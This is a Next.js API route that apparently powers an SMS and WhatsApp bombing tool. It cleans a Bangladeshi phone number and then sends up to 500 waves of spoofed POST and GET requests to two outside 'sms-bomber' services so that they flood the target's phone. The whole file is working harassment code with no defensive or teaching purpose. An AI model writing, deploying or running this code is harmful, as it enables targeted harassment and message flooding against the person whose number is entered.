// pages/api/attack.js

export default async function handler(req, res) {
  if (req.method !== 'POST') return res.status(405).send('Method not allowed');

  let { number, amount, isUltimate } = req.body;

  // 1. Number Cleaning (Strict Format)
  let cleanNumber = number.toString().replace(/\D/g, ''); 
  if (cleanNumber.startsWith('88')) cleanNumber = cleanNumber.substring(2);
  if (cleanNumber.startsWith('0')) { /* Keep it as 01XXXXXXXX */ }

  // 2. Target Endpoints (We will hit multiple variations)
  const targetBaseUrls = [
    'https://nuke-sms-bomber.pages.dev/',
    'https://shadowx-sms-bomber.onrender.com/'
  ];

  const runAttack = async () => {
    // Ultimate mode e speed ebong wave beshi hobe
    const totalWaves = isUltimate ? 500 : amount; 
    const delay = isUltimate ? 600 : 1500; 

    for (let i = 0; i < totalWaves; i++) {
      // Amra protibar ekta unique payload banabo jate site confuse hoy
      const payload = {
        number: cleanNumber,
        phone: cleanNumber,
        target: cleanNumber,
        amount: 1,
        count: 1,        
        country: "BD",
        service: "whatsapp",
        msg: "Ultimate Attack",
        auth: "true",
        token: Math.random().toString(36).substring(7),
        is_active: true,
        status: "active"
      };

      const attackRequests = targetBaseUrls.map(async (baseUrl) => {
        try {
          // Method 1: POST with Heavy Headers
          await fetch(baseUrl, {
            method: 'POST',
            headers: { 
              'Content-Type': 'application/json',
              'Accept': 'application/json, text/plain, */*',
              'Accept-Language': 'en-US,en;q=0.9',
              'Cache-Control': 'no-cache',
              'Origin': baseUrl,
              'Referer': baseUrl,
              'User-Agent': 'Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36',
              'X-Requested-With': 'XMLHttpRequest',
            },
            body: JSON.stringify(payload),
            mode: 'no-cors' // Bypass CORS
          });

          // Method 2: GET with Query Params (Fallback)
          const fallbackUrl = `${baseUrl}?number=${cleanNumber}&amount=1&country=BD&service=whatsapp`;
          await fetch(fallbackUrl, {
            method: 'GET',
            mode: 'no-cors',
            headers: {
              'User-Agent': 'Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36',
            }
          });

        } catch (err) {
          console.error(`[Wave ${i}] Error: ${err.message}`);
        }
      });

      await Promise.all(attackRequests);
      await new Promise(resolve => setTimeout(resolve, delay));
    }
  };

  runAttack();

  return res.status(200).json({ 
    success: true, 
    message: isUltimate ? "ULTIMATE ATTACK INITIATED! 🚀" : "ATTACK STARTED! 🔥" 
  });
}
